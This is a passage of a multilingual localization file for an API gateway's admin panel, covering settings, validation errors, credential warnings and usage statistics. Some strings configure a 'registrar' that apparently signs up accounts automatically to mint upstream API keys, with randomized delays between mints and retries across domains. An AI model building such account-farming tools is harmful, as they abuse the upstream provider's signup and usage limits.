있습니다.\" },\n  \"set.readback\": { \"zh-CN\": \"已回读生效值，{count} 个字段发生了变化（已高亮）。\", \"zh-TW\": \"已回讀生效值，{count} 個欄位發生了變化（已標示）。\", en: \"Read back the effective values: {count} field(s) changed (highlighted).\", ja: \"実効値を読み戻しました。{count} 個の項目が変化しました（ハイライト済み）。\", ko: \"실효값을 다시 읽었습니다. {count}개 항목이 변경되었습니다(강조 표시).\" },\n  \"set.readback.none\": { \"zh-CN\": \"已回读生效值，没有字段发生变化。\", \"zh-TW\": \"已回讀生效值，沒有欄位發生變化。\", en: \"Read back the effective values: nothing changed.\", ja: \"実効値を読み戻しました。変化した項目はありません。\", ko: \"실효값을 다시 읽었습니다. 변경된 항목이 없습니다.\" },\n  \"set.nothingToSave\": { \"zh-CN\": \"没有要保存的改动\", \"zh-TW\": \"沒有要儲存的改動\", en: \"Nothing to save\", ja: \"保存する変更はありません\", ko: \"저장할 변경 사항이 없습니다\" },\n  \"set.saveFailed\": { \"zh-CN\": \"保存失败\", \"zh-TW\": \"儲存失敗\", en: \"Save failed\", ja: \"保存に失敗しました\", ko: \"저장에 실패했습니다\" },\n  \"set.degraded\": { \"zh-CN\": \"本次装载有字段回落到了内置取值（存储里的值读不出来或不合法）。面板上「生效」那一列才是真的在用的值。\", \"zh-TW\": \"本次載入有欄位回落到了內建取值（儲存裡的值讀不出來或不合法）。面板上「生效」那一列才是真的在用的值。\", en: \"Some fields fell back to their built-in values on this load (the stored value was unreadable or invalid). The \\\\u201ceffective\\\\u201d column is what is actually in use.\", ja: \"今回の読み込みで一部の項目が組み込み値にフォールバックしました（保存値が読めないか不正）。実際に使われているのは「実効値」の列です。\", ko: \"이번 로드에서 일부 항목이 내장값으로 폴백했습니다(저장값을 읽을 수 없거나 올바르지 않음). 실제로 쓰이는 값은 「실효값」 열입니다.\" },\n  \"set.advanced.title\": { \"zh-CN\": \"高级（改动前请读一遍说明）\", \"zh-TW\": \"進階（改動前請讀一遍說明）\", en: \"Advanced (read the note first)\", ja: \"詳細設定（先に説明をお読みください）\", ko: \"고급(먼저 설명을 읽으세요)\" },\n  \"set.advanced.warn\": { \"zh-CN\": \"这里填的地址是每一次自动注册的去向：换成别的服务器，那台服务器就能收到本网关注册时用的邮箱、密码与验证码。只有你自己搭了同样的注册后端时才改它。\", \"zh-TW\": \"這裡填的位址是每一次自動註冊的去向：換成別的伺服器，那台伺服器就能收到本網關註冊時用的信箱、密碼與驗證碼。只有你自己搭了同樣的註冊後端時才改它。\", en: \"This address is where every automated registration goes. Point it elsewhere and that server receives the mailbox, password and verification code used for each registration. Change it only if you run an equivalent registration backend yourself.\", ja: \"ここに入れるアドレスは、すべての自動登録の送信先です。別のサーバーに変えると、そのサーバーが各登録に使うメールアドレス・パスワード・認証コードを受け取ります。同等の登録バックエンドを自分で運用している場合にのみ変更してください。\", ko: \"여기에 넣는 주소는 모든 자동 가입의 전송 대상입니다. 다른 서버로 바꾸면 그 서버가 각 가입에 쓰이는 메일 주소·비밀번호·인증 코드를 받게 됩니다. 동일한 가입 백엔드를 직접 운영하는 경우에만 변경하세요.\" },\n  \"set.advanced.confirmTitle\": { \"zh-CN\": \"确认修改注册去向\", \"zh-TW\": \"確認修改註冊去向\", en: \"Confirm the registration endpoint change\", ja: \"登録先の変更を確認\", ko: \"가입 대상 변경 확인\" },\n  \"set.advanced.save\": { \"zh-CN\": \"保存高级设置\", \"zh-TW\": \"儲存進階設定\", en: \"Save advanced settings\", ja: \"詳細設定を保存\", ko: \"고급 설정 저장\" },\n  \"set.clear.title\": { \"zh-CN\": \"清空凭据\", \"zh-TW\": \"清空憑據\", en: \"Clear credential\", ja: \"資格情報をクリア\", ko: \"자격 증명 지우기\" },\n  \"set.clear.warn\": { \"zh-CN\": \"要把「{field}」从存储里删掉吗？这一步不可撤销。\", \"zh-TW\": \"要把「{field}」從儲存裡刪掉嗎？這一步不可撤銷。\", en: \"Delete \\\\u201c{field}\\\\u201d from storage? This cannot be undone.\", ja: \"「{field}」をストレージから削除しますか？この操作は取り消せません。\", ko: \"「{field}」을(를) 저장소에서 삭제할까요? 되돌릴 수 없습니다.\" },\n  // ⚠️⚠️ **清空凭据的那句警告按状态分岔成四条，每一条都是确定句、没有「如果」。**\n  // 第一版是一句带「如果环境变量里也没有……」的条件句 —— 那等于把判断推回给读的人，\n  // 而他手上恰恰没有比面板更多的信息。**同一句通用红字，在这几种状态下有的是救命、\n  // 有的是吓人。** 分岔判据在 `admin-ui/js/pure/settings.mjs` 的 `clearWarning()`，\n  // 那里连「红不红」也一起给（取值决策不许落在板块文件里）。\n  \"set.clear.effect.env\": { \"zh-CN\": \"环境变量里也提供了这一项：清空之后会回落到环境变量里的值，生效值不变。\", \"zh-TW\": \"環境變數裡也提供了這一項：清空之後會回落到環境變數裡的值，生效值不變。\", en: \"The environment also supplies this value: after clearing, it falls back to the environment variable and the effective value does not change.\", ja: \"この項目は環境変数からも与えられています。クリアすると環境変数の値にフォールバックし、実効値は変わりません。\", ko: \"이 항목은 환경 변수에서도 제공됩니다. 지우면 환경 변수의 값으로 폴백하며 실효값은 바뀌지 않습니다.\" },\n  \"set.clear.effect.gatewayMissing\": { \"zh-CN\": \"环境变量里没有 GATEWAY_TOKEN：清空之后当前进程靠上一份快照还能继续跑，但下一次重启 / isolate 回收会起不来。清完请立刻在这一页写一把新的网关口令。\", \"zh-TW\": \"環境變數裡沒有 GATEWAY_TOKEN：清空之後當前行程靠上一份快照還能繼續跑，但下一次重啟 / isolate 回收會起不來。清完請立刻在這一頁寫一把新的網關口令。\", en: \"GATEWAY_TOKEN is not in the environment: after clearing, this process keeps running on its last good snapshot, but the next restart or isolate recycle will fail to start. Set a new gateway token on this page immediately afterwards.\", ja: \"環境変数に GATEWAY_TOKEN がありません。クリア後、現在のプロセスは直前の有効なスナップショットで動き続けますが、次の再起動や isolate の再生成で起動できなくなります。クリア後はすぐにこのページで新しいゲートウェイトークンを設定してください。\", ko: \"환경 변수에 GATEWAY_TOKEN이 없습니다. 지운 뒤 현재 프로세스는 마지막 정상 스냅숏으로 계속 동작하지만, 다음 재시작이나 isolate 회수 시 기동에 실패합니다. 지운 직후 이 페이지에서 새 게이트웨이 토큰을 설정하세요.\" },\n  \"set.clear.effect.channelBreaks\": { \"zh-CN\": \"环境变量里没有这一项，而注册机开着、这条通道就在主/备链上：清空之后当前进程还能跑，但下一次重启 / isolate 回收会起不来。清完请立刻重新填上，或者先把这条通道从主/备里去掉。\", \"zh-TW\": \"環境變數裡沒有這一項，而註冊機開著、這條通道就在主/備鏈上：清空之後當前行程還能跑，但下一次重啟 / isolate 回收會起不來。清完請立刻重新填上，或者先把這條通道從主/備裡去掉。\", en: \"The environment does not supply this value, the registrar is on, and this channel is on the primary/fallback chain: after clearing, this process keeps running, but the next restart or isolate recycle will fail to start. Re-enter it immediately, or first remove this channel from the primary/fallback selection.\", ja: \"この項目は環境変数になく、レジストラーは有効で、このチャネルは主／フォールバックの連鎖に入っています。クリア後も現在のプロセスは動き続けますが、次の再起動や isolate の再生成で起動できなくなります。すぐに入れ直すか、先にこのチャネルを主／フォールバックから外してください。\", ko: \"이 항목은 환경 변수에 없고, 등록기가 켜져 있으며, 이 채널이 주/대체 체인에 들어 있습니다. 지운 뒤에도 현재 프로세스는 계속 동작하지만 다음 재시작이나 isolate 회수 시 기동에 실패합니다. 즉시 다시 입력하거나, 먼저 이 채널을 주/대체에서 빼세요.\" },\n  \"set.clear.effect.channelIdle\": { \"zh-CN\": \"这条通道现在不在主/备链上（或注册机是关着的），清空它现在不影响任何东西；但把它接上链之前必须重新填。\", \"zh-TW\": \"這條通道現在不在主/備鏈上（或註冊機是關著的），清空它現在不影響任何東西；但把它接上鏈之前必須重新填。\", en: \"This channel is not on the primary/fallback chain right now (or the registrar is off), so clearing it changes nothing today — but you must fill it in again before putting the channel back on the chain.\", ja: \"このチャネルは現在、主／フォールバックの連鎖に入っていません（またはレジストラーが無効です）。今クリアしても何にも影響しませんが、このチャネルを連鎖に戻す前には入れ直す必要があります。\", ko: \"이 채널은 지금 주/대체 체인에 들어 있지 않습니다(또는 등록기가 꺼져 있습니다). 지금 지워도 아무 영향이 없지만, 이 채널을 다시 체인에 넣기 전에는 반드시 다시 입력해야 합니다.\" },\n  \"set.clear.gatewayMissing\": { \"zh-CN\": \"网关口令已经被清空，而环境变量里也没有：请立刻在这一页写一把新的，否则下一次重启会起不来。\", \"zh-TW\": \"網關口令已經被清空，而環境變數裡也沒有：請立刻在這一頁寫一把新的，否則下一次重啟會起不來。\", en: \"The gateway token has been cleared and there is none in the environment either. Set a new one on this page now, or the next restart will fail.\", ja: \"ゲートウェイトークンがクリアされ、環境変数にもありません。今すぐこのページで新しいものを設定してください。さもないと次回の起動に失敗します。\", ko: \"게이트웨이 토큰이 지워졌고 환경 변수에도 없습니다. 지금 이 페이지에서 새로 설정하지 않으면 다음 재시작에 실패합니다.\" },\n  \"set.clear.done\": { \"zh-CN\": \"「{field}」已从存储里清空\", \"zh-TW\": \"「{field}」已從儲存裡清空\", en: \"\\\\u201c{field}\\\\u201d cleared from storage\", ja: \"「{field}」をストレージからクリアしました\", ko: \"「{field}」을(를) 저장소에서 지웠습니다\" },\n  \"set.loadBlocked\": { \"zh-CN\": \"存储里这份配置现在装载不起来：当前进程靠上一份合法快照还在跑，但下一次重启 / isolate 回收会失败。下面逐条列出缺什么，改完保存即可恢复——这一页仍然可以编辑。\", \"zh-TW\": \"儲存裡這份設定現在載入不起來：當前行程靠上一份合法快照還在跑，但下一次重啟 / isolate 回收會失敗。下面逐條列出缺什麼，改完儲存即可恢復——這一頁仍然可以編輯。\", en: \"The stored configuration currently cannot be loaded: this process is still running on its last good snapshot, but the next restart or isolate recycle will fail. What is missing is listed below — fix and save to recover; this page is still editable.\", ja: \"保存されている設定は現在読み込めません。このプロセスは直前の有効なスナップショットで動作を続けていますが、次の再起動や isolate の再生成で失敗します。不足している項目を以下に列挙します。修正して保存すれば復旧できます——このページは引き続き編集できます。\", ko: \"저장된 설정을 현재 불러올 수 없습니다. 이 프로세스는 마지막 정상 스냅숏으로 계속 동작 중이지만 다음 재시작이나 isolate 회수 시 실패합니다. 무엇이 빠졌는지 아래에 나열합니다. 고쳐서 저장하면 복구됩니다 — 이 페이지는 계속 편집할 수 있습니다.\" },\n  \"set.err.unknown_field\": { \"zh-CN\": \"这个字段后端不认识\", \"zh-TW\": \"這個欄位後端不認識\", en: \"The backend does not recognize this field\", ja: \"このフィールドはバックエンドが認識しません\", ko: \"백엔드가 인식하지 못하는 항목입니다\" },\n  \"set.err.locked_by_env\": { \"zh-CN\": \"被环境变量 {env} 锁定，改不了\", \"zh-TW\": \"被環境變數 {env} 鎖定，改不了\", en: \"Locked by the environment variable {env}\", ja: \"環境変数 {env} によりロックされています\", ko: \"환경 변수 {env}로 잠겨 있습니다\" },\n  \"set.err.not_an_integer\": { \"zh-CN\": \"必须是整数\", \"zh-TW\": \"必須是整數\", en: \"Must be an integer\", ja: \"整数である必要があります\", ko: \"정수여야 합니다\" },\n  \"set.err.below_min\": { \"zh-CN\": \"不能小于 {min}\", \"zh-TW\": \"不能小於 {min}\", en: \"Must be at least {min}\", ja: \"{min} 以上である必要があります\", ko: \"{min} 이상이어야 합니다\" },\n  \"set.err.not_a_string\": { \"zh-CN\": \"必须是文本\", \"zh-TW\": \"必須是文字\", en: \"Must be text\", ja: \"文字列である必要があります\", ko: \"문자열이어야 합니다\" },\n  \"set.err.not_a_boolean\": { \"zh-CN\": \"必须是开或关\", \"zh-TW\": \"必須是開或關\", en: \"Must be on or off\", ja: \"オンまたはオフである必要があります\", ko: \"켜기 또는 끄기여야 합니다\" },\n  \"set.err.empty\": { \"zh-CN\": \"这一格不能留空\", \"zh-TW\": \"這一格不能留空\", en: \"This field cannot be empty\", ja: \"この項目は空にできません\", ko: \"이 항목은 비울 수 없습니다\" },\n  \"set.err.too_long\": { \"zh-CN\": \"最长 {max} 个字符\", \"zh-TW\": \"最長 {max} 個字元\", en: \"At most {max} characters\", ja: \"最大 {max} 文字です\", ko: \"최대 {max}자입니다\" },\n  \"set.err.not_a_url\": { \"zh-CN\": \"必须是 http:// 或 https:// 开头的地址\", \"zh-TW\": \"必須是 http:// 或 https:// 開頭的位址\", en: \"Must be an http:// or https:// URL\", ja: \"http:// または https:// で始まる URL が必要です\", ko: \"http:// 또는 https:// 로 시작하는 주소여야 합니다\" },\n  \"set.err.not_a_channel\": { \"zh-CN\": \"只能选列表里的通道\", \"zh-TW\": \"只能選清單裡的通道\", en: \"Pick one of the listed channels\", ja: \"一覧にあるチャネルから選んでください\", ko: \"목록에 있는 채널 중에서 선택하세요\" },\n  \"set.err.primary_required\": { \"zh-CN\": \"注册机开着时必须选一条主通道\", \"zh-TW\": \"註冊機開著時必須選一條主通道\", en: \"A primary channel is required while the registrar is on\", ja: \"レジストラーが有効なときは主チャネルの選択が必要です\", ko: \"등록기가 켜져 있을 때는 주 채널을 선택해야 합니다\" },\n  \"set.err.fallback_equals_primary\": { \"zh-CN\": \"备用通道不能与主通道是同一条\", \"zh-TW\": \"備用通道不能與主通道是同一條\", en: \"The fallback channel cannot be the same as the primary one\", ja: \"フォールバックチャネルは主チャネルと同じにできません\", ko: \"대체 채널은 주 채널과 같을 수 없습니다\" },\n  \"set.err.delay_min_gt_max\": { \"zh-CN\": \"最小间隔 {min} 不能大于最大间隔 {max}\", \"zh-TW\": \"最小間隔 {min} 不能大於最大間隔 {max}\", en: \"The minimum delay {min} cannot exceed the maximum {max}\", ja: \"最小間隔 {min} は最大間隔 {max} を超えられません\", ko: \"최소 간격 {min}은 최대 간격 {max}보다 클 수 없습니다\" },\n  \"set.err.channel_credentials_missing\": { \"zh-CN\": \"{channel} 这条通道还差凭据，注册机开着时它必须配全\", \"zh-TW\": \"{channel} 這條通道還差憑據，註冊機開著時它必須配全\", en: \"The {channel} channel is missing credentials, which are required while the registrar is on\", ja: \"{channel} チャネルの資格情報が不足しています。レジストラーが有効な間は必須です\", ko: \"{channel} 채널의 자격 증명이 없습니다. 등록기가 켜져 있는 동안에는 필수입니다\" },\n  \"set.err.gateway_token_required\": { \"zh-CN\": \"网关口令不能两边都没有：环境变量里没有，存储里也清空了，下一次冷启动会起不来\", \"zh-TW\": \"網關口令不能兩邊都沒有：環境變數裡沒有，儲存裡也清空了，下一次冷啟動會起不來\", en: \"The gateway token cannot be missing from both sides: it is absent from the environment and cleared in storage, so the next cold start will fail\", ja: \"ゲートウェイトークンが両方にない状態にはできません。環境変数になく、ストレージでもクリアされているため、次のコールドスタートで起動できなくなります\", ko: \"게이트웨이 토큰이 양쪽 모두에 없을 수는 없습니다. 환경 변수에도 없고 저장소에서도 지워져 다음 콜드 스타트에 기동이 실패합니다\" },\n  \"set.err.whitespace_padded\": { \"zh-CN\": \"首尾不能有空白：HTTP 请求头的值在传输层会被去掉首尾空白，带空白的口令客户端永远送不出来\", \"zh-TW\": \"首尾不能有空白：HTTP 請求標頭的值在傳輸層會被去掉首尾空白，帶空白的口令客戶端永遠送不出來\", en: \"No leading or trailing whitespace: header values are trimmed in transport, so a padded token can never be sent by any client\", ja: \"先頭・末尾に空白を含められません。HTTP ヘッダー値は転送時に前後の空白が取り除かれるため、空白付きのトークンはどのクライアントからも送信できません\", ko: \"앞뒤에 공백을 넣을 수 없습니다. HTTP 헤더 값은 전송 단계에서 앞뒤 공백이 제거되므로 공백이 붙은 토큰은 어떤 클라이언트도 보낼 수 없습니다\" },\n  \"set.err.not_sendable\": { \"zh-CN\": \"只能用可打印 ASCII（0x20–0x7E）：汉字 / emoji / 零宽空格这类字符浏览器根本发不出去\", \"zh-TW\": \"只能用可列印 ASCII（0x20–0x7E）：漢字 / emoji / 零寬空格這類字元瀏覽器根本送不出去\", en: \"Printable ASCII only (0x20–0x7E): CJK characters, emoji and zero-width spaces simply cannot be sent by the browser\", ja: \"印字可能な ASCII（0x20–0x7E）のみ使用できます。漢字・emoji・ゼロ幅スペースはブラウザーがそもそも送信できません\", ko: \"출력 가능한 ASCII(0x20–0x7E)만 쓸 수 있습니다. 한자 / 이모지 / 폭 없는 공백은 브라우저가 아예 보낼 수 없습니다\" },\n  \"set.err.too_short\": { \"zh-CN\": \"至少 {min} 位：这条路没有分布式限速，口令熵是唯一的防线\", \"zh-TW\": \"至少 {min} 位：這條路沒有分散式限速，口令熵是唯一的防線\", en: \"At least {min} characters: there is no distributed rate limiting on this path, so token entropy is the only defence\", ja: \"{min} 文字以上にしてください。この経路には分散レート制限がないため、トークンのエントロピーが唯一の防御です\", ko: \"최소 {min}자 이상이어야 합니다. 이 경로에는 분산 속도 제한이 없어 토큰 엔트로피가 유일한 방어선입니다\" },\n  \"set.err.same_as_admin_token\": { \"zh-CN\": \"网关口令不能与管理口令相同：中转口令是发给每一个下游用户的，设成相同之后管理接口会立刻停用，连改回去都做不到\", \"zh-TW\": \"網關口令不能與管理口令相同：中轉口令是發給每一個下游使用者的，設成相同之後管理介面會立刻停用，連改回去都做不到\", en: \"The gateway token must differ from the admin token: the gateway token is handed to every downstream user, and making them equal disables the admin API immediately — you could not even change it back\", ja: \"ゲートウェイトークンは管理トークンと同じにできません。ゲートウェイトークンはすべての下流ユーザーに配るものであり、同じにすると管理 API が即座に無効化され、元に戻すことすらできなくなります\", ko: \"게이트웨이 토큰은 관리 토큰과 같을 수 없습니다. 게이트웨이 토큰은 모든 하위 사용자에게 배포하는 값이며, 같게 만들면 관리 API가 즉시 중단되어 되돌리는 것조차 불가능합니다\" },\n  \"set.err.config_unloadable\": { \"zh-CN\": \"这份配置构造不出来，而逐字段判据说不出是哪一格（多半是某个数值字段被写成了非数字）。具体原因在事件板块的 config.unloadable 里。\", \"zh-TW\": \"這份設定建構不出來，而逐欄位判據說不出是哪一格（多半是某個數值欄位被寫成了非數字）。具體原因在事件板塊的 config.unloadable 裡。\", en: \"This configuration cannot be constructed, and the per-field checks cannot say which field is at fault (most likely a numeric field was written as a non-number). The concrete reason is in the events board under config.unloadable.\", ja: \"この設定は構築できませんが、項目ごとの判定ではどの項目が原因かを特定できません（数値項目が数値以外で書かれている可能性が高いです）。具体的な理由はイベント一覧の config.unloadable にあります。\", ko: \"이 설정을 구성할 수 없으며, 항목별 판정으로는 어느 항목이 원인인지 알 수 없습니다(숫자 항목이 숫자가 아닌 값으로 기록되었을 가능성이 큽니다). 구체적인 이유는 이벤트 보드의 config.unloadable에 있습니다.\" },\n  \"set.err.unknown\": { \"zh-CN\": \"后端返回了这个面板版本不认识的错误码：{code}\", \"zh-TW\": \"後端回傳了這個面板版本不認識的錯誤碼：{code}\", en: \"The backend returned an error code this panel build does not know: {code}\", ja: \"このパネルのビルドが認識しないエラーコードが返されました: {code}\", ko: \"이 패널 빌드가 알지 못하는 오류 코드가 반환되었습니다: {code}\" },\n  \"set.field.gatewayToken\": { \"zh-CN\": \"网关口令\", \"zh-TW\": \"網關口令\", en: \"Gateway token\", ja: \"ゲートウェイトークン\", ko: \"게이트웨이 토큰\" },\n  \"set.field.agnesBaseUrl\": { \"zh-CN\": \"上游地址\", \"zh-TW\": \"上游位址\", en: \"Upstream base URL\", ja: \"上流ベース URL\", ko: \"업스트림 기본 URL\" },\n  \"set.field.upstreamTimeoutMs\": { \"zh-CN\": \"上游超时（毫秒）\", \"zh-TW\": \"上游逾時（毫秒）\", en: \"Upstream timeout (ms)\", ja: \"上流タイムアウト（ミリ秒）\", ko: \"업스트림 타임아웃(ms)\" },\n  \"set.field.upstreamSyncTimeoutMs\": { \"zh-CN\": \"同步端点超时（毫秒）\", \"zh-TW\": \"同步端點逾時（毫秒）\", en: \"Sync endpoint timeout (ms)\", ja: \"同期エンドポイントのタイムアウト（ミリ秒）\", ko: \"동기 엔드포인트 타임아웃(ms)\" },\n  \"set.field.maxStrikes\": { \"zh-CN\": \"连续失败上限\", \"zh-TW\": \"連續失敗上限\", en: \"Max consecutive failures\", ja: \"連続失敗の上限\", ko: \"연속 실패 상한\" },\n  \"set.field.cooldownRateLimitMs\": { \"zh-CN\": \"限流冷却（毫秒）\", \"zh-TW\": \"限流冷卻（毫秒）\", en: \"Rate-limit cooldown (ms)\", ja: \"レート制限クールダウン（ミリ秒）\", ko: \"속도 제한 쿨다운(ms)\" },\n  \"set.field.cooldownPaymentMs\": { \"zh-CN\": \"欠费冷却（毫秒）\", \"zh-TW\": \"欠費冷卻（毫秒）\", en: \"Payment-required cooldown (ms)\", ja: \"支払い必要時のクールダウン（ミリ秒）\", ko: \"결제 필요 쿨다운(ms)\" },\n  \"set.field.cooldownStrikeMs\": { \"zh-CN\": \"失败冷却（毫秒）\", \"zh-TW\": \"失敗冷卻（毫秒）\", en: \"Strike cooldown (ms)\", ja: \"失敗クールダウン（ミリ秒）\", ko: \"실패 쿨다운(ms)\" },\n  \"set.field.poolCacheTtlMs\": { \"zh-CN\": \"池快照缓存（毫秒，0 = 关闭）\", \"zh-TW\": \"池快照快取（毫秒，0 = 關閉）\", en: \"Pool snapshot cache (ms, 0 = off)\", ja: \"プールスナップショットのキャッシュ（ミリ秒、0 = 無効）\", ko: \"풀 스냅숏 캐시(ms, 0 = 끔)\" },\n  \"set.field.poolTouchIntervalMs\": { \"zh-CN\": \"写消除间隔（毫秒，0 = 关闭）\", \"zh-TW\": \"寫入消除間隔（毫秒，0 = 關閉）\", en: \"Write-elision interval (ms, 0 = off)\", ja: \"書き込み省略の間隔（ミリ秒、0 = 無効）\", ko: \"쓰기 생략 간격(ms, 0 = 끔)\" },\n  \"set.field.registrar.enabled\": { \"zh-CN\": \"启用注册机\", \"zh-TW\": \"啟用註冊機\", en: \"Enable the registrar\", ja: \"レジストラーを有効にする\", ko: \"등록기 사용\" },\n  \"set.field.registrar.primary\": { \"zh-CN\": \"主通道\", \"zh-TW\": \"主通道\", en: \"Primary channel\", ja: \"主チャネル\", ko: \"주 채널\" },\n  \"set.field.registrar.fallback\": { \"zh-CN\": \"备用通道\", \"zh-TW\": \"備用通道\", en: \"Fallback channel\", ja: \"フォールバックチャネル\", ko: \"대체 채널\" },\n  \"set.field.registrar.targetKeys\": { \"zh-CN\": \"目标 key 数\", \"zh-TW\": \"目標 key 數\", en: \"Target key count\", ja: \"目標キー数\", ko: \"목표 key 수\" },\n  \"set.field.registrar.mintBatch\": { \"zh-CN\": \"单轮最多铸几把\", \"zh-TW\": \"單輪最多鑄幾把\", en: \"Max keys minted per round\", ja: \"1 ラウンドあたりの最大発行数\", ko: \"라운드당 최대 발급 수\" },\n  \"set.field.registrar.tendIntervalMs\": { \"zh-CN\": \"补池间隔（毫秒）\", \"zh-TW\": \"補池間隔（毫秒）\", en: \"Refill interval (ms)\", ja: \"補充間隔（ミリ秒）\", ko: \"보충 간격(ms)\" },\n  \"set.field.registrar.codeTimeoutMs\": { \"zh-CN\": \"等验证码超时（毫秒）\", \"zh-TW\": \"等驗證碼逾時（毫秒）\", en: \"Verification-code timeout (ms)\", ja: \"認証コード待機のタイムアウト（ミリ秒）\", ko: \"인증 코드 대기 타임아웃(ms)\" },\n  \"set.field.registrar.mintDelayMinMs\": { \"zh-CN\": \"两次铸 key 的最小间隔（毫秒）\", \"zh-TW\": \"兩次鑄 key 的最小間隔（毫秒）\", en: \"Minimum delay between mints (ms)\", ja: \"発行間の最小間隔（ミリ秒）\", ko: \"발급 간 최소 간격(ms)\" },\n  \"set.field.registrar.mintDelayMaxMs\": { \"zh-CN\": \"两次铸 key 的最大间隔（毫秒）\", \"zh-TW\": \"兩次鑄 key 的最大間隔（毫秒）\", en: \"Maximum delay between mints (ms)\", ja: \"発行間の最大間隔（ミリ秒）\", ko: \"발급 간 최대 간격(ms)\" },\n  \"set.field.registrar.maxDomainAttempts\": { \"zh-CN\": \"换域名重试次数上限\", \"zh-TW\": \"換網域重試次數上限\", en: \"Max domain retries\", ja: \"ドメイン再試行の上限\", ko: \"도메인 재시도 상한\" },\n  \"set.field.registrar.tokenName\": { \"zh-CN\": \"铸出的 key 在上游后台的显示名\", \"zh-TW\": \"鑄出的 key 在上游後台的顯示名\", en: \"Display name for minted keys upstream\", ja: \"発行したキーの上流での表示名\", ko: \"발급된 key의 업스트림 표시 이름\" },\n  \"set.field.registrar.agnesPlatformUrl\": { \"zh-CN\": \"注册后端地址\", \"zh-TW\": \"註冊後端位址\", en: \"Registration backend URL\", ja: \"登録バックエンドの URL\", ko: \"가입 백엔드 URL\" },\n  \"set.field.channel.baseUrl\": { \"zh-CN\": \"服务地址\", \"zh-TW\": \"服務位址\", en: \"Service URL\", ja: \"サービス URL\", ko: \"서비스 URL\" },\n  \"set.field.channel.apiKey\": { \"zh-CN\": \"API Key\", \"zh-TW\": \"API Key\", en: \"API key\", ja: \"API キー\", ko: \"API 키\" },\n\n  // ── 用量板块（P3d Task 5，设计 §10.6）──────────────────────────────────────\n  //\n  // ⚠️ **这一段的每一条文案都在回答「这个数字为什么长这样」，而不是给一个数配一个名字。**\n  // 这个板块的全部难点是「今天真的是 0 次请求」「Tier-2 没开」「读不出来」\n  // 「读到的分片全坏了」在面板上长得一模一样，而它们是四件事。\n  //\n  // ⚠️ **`{占位符}` 的那几条一律只经 `t(key, {…})` 用**（门禁第 ⑧ 条）：\n  // 交给 `elI18n(tag, key)` 会让裸的 `{count}` 直接展示给运维看\n  //（`sec-overview.js` 的 `ov.config.envLocked` 上方记着那次真实事故）。\n  \"usage.title\":      { \"zh-CN\": \"用量\", \"zh-TW\": \"用量\", en: \"Usage\", ja: \"使用量\", ko: \"사용량\" },\n  \"usage.rangeLabel\": { \"zh-CN\": \"时间范围\", \"zh-TW\": \"時間範圍\", en: \"Time range\", ja: \"期間\", ko: \"기간\" },\n  \"usage.range.24h\":  { \"zh-CN\": \"24 小时\", \"zh-TW\": \"24 小時\", en: \"24h\", ja: \"24 時間\", ko: \"24시간\" },\n  \"usage.range.3d\":   { \"zh-CN\": \"3 天\", \"zh-TW\": \"3 天\", en: \"3d\", ja: \"3 日\", ko: \"3일\" },\n  \"usage.range.7d\":   { \"zh-CN\": \"7 天\", \"zh-TW\": \"7 天\", en: \"7d\", ja: \"7 日\", ko: \"7일\" },\n  \"usage.range.30d\":  { \"zh-CN\": \"30 天\", \"zh-TW\": \"30 天\", en: \"30d\", ja: \"30 日\", ko: \"30일\" },\n  // 覆盖区间**渲染服务端回读的那一对**，不是前端自己算的显示区间。\n  \"usage.covered\":    { \"zh-CN\": \"覆盖区间：{from} — {to}\", \"zh-TW\": \"涵蓋區間：{from} — {to}\", en: \"Covered range: {from} — {to}\", ja: \"対象期間: {from} — {to}\", ko: \"대상 구간: {from} — {to}\" },\n  // ⚠️ **30 天那一档的说明。写「更早的已过期」是事实（保留期 30 天）；\n  //    而它一次要读满 30 天的分片这件事在 Cloudflare Worker 上还没有真机结论\n  //    ——**这里刻意不写「这些子请求是安全的」**，也不写它一定会失败。\n  \"usage.range.retention\": { \"zh-CN\": \"最多保留 30 天，更早的数据已经过期。30 天这一档一次要把整段区间的分片全部读回来；它在 Cloudflare Worker 上是否总能完成，尚未在真机上验证过——失败时这里会如实显示为读取失败，不会给出一份看起来完整的数字。\", \"zh-TW\": \"最多保留 30 天，更早的資料已經過期。30 天這一檔一次要把整段區間的分片全部讀回來；它在 Cloudflare Worker 上是否總能完成，尚未在真機上驗證過——失敗時這裡會如實顯示為讀取失敗，不會給出一份看起來完整的數字。\", en: \"At most 30 days are retained; anything older has expired. The 30-day option reads every shard in the whole range in one go; whether that always completes on Cloudflare Workers has not been verified on real infrastructure yet. If it fails, this page reports a read failure rather than showing numbers that look complete.\", ja: \"保持期間は最長 30 日で、それより古いデータは失効しています。30 日の選択肢は区間全体のシャードを一度に読み出します。これが Cloudflare Workers 上で常に完了するかどうかは実機で未検証です。失敗した場合は、完全に見える数字を出すのではなく読み取り失敗として表示します。\", ko: \"최대 30일까지만 보관하며 그보다 오래된 데이터는 만료되었습니다. 30일 옵션은 구간 전체의 샤드를 한 번에 읽습니다. 이것이 Cloudflare Workers에서 항상 완료되는지는 실제 환경에서 아직 검증되지 않았습니다. 실패하면 완전해 보이는 숫자를 보여주는 대신 읽기 실패로 표시합니다.\" },\n\n  // ── 六张汇总卡（设计 §10.6）────────────────────────────────────────────────\n  \"usage.card.requests\":  { \"zh-CN\": \"总请求数\", \"zh-TW\": \"總請求數\", en: \"Requests\", ja: \"リクエスト数\", ko: \"요청 수\" },\n  \"usage.card.successRate\": { \"zh-CN\": \"成功率\", \"zh-TW\": \"成功率\", en: \"Success rate\", ja: \"成功率\", ko: \"성공률\" },\n  // ⚠️ **单位写进标题，值那一格只放数字**：`format.mjs` 的 `fmtDuration` 只到\n  //    「秒 / 分」两档精度（那是给运行时长设计的），拿它渲染 300 毫秒会写出\n  //    「0秒」——而本模块不许再写第三个格式化函数（评审 I17）。\n  \"usage.card.latency\":   { \"zh-CN\": \"平均延迟（毫秒）\", \"zh-TW\": \"平均延遲（毫秒）\", en: \"Avg latency (ms)\", ja: \"平均レイテンシ（ミリ秒）\", ko: \"평균 지연(밀리초)\" },\n  \"usage.card.errorRate\": { \"zh-CN\": \"错误率\", \"zh-TW\": \"錯誤率\", en: \"Error rate\", ja: \"エラー率\", ko: \"오류율\" },\n  // 标题里**直接写「仅非流式」**：流式请求的 token 网关根本看不到，\n  // 一个不带这三个字的「Token」会被读成全量。\n  \"usage.card.tokens\":    { \"zh-CN\": \"Token（仅非流式）\", \"zh-TW\": \"Token（僅非串流）\", en: \"Tokens (non-streaming only)\", ja: \"トークン（非ストリーミングのみ）\", ko: \"토큰(비스트리밍만)\" },\n  \"usage.card.streaming\": { \"zh-CN\": \"流式请求数\", \"zh-TW\": \"串流請求數\", en: \"Streaming requests\", ja: \"ストリーミングリクエスト数\", 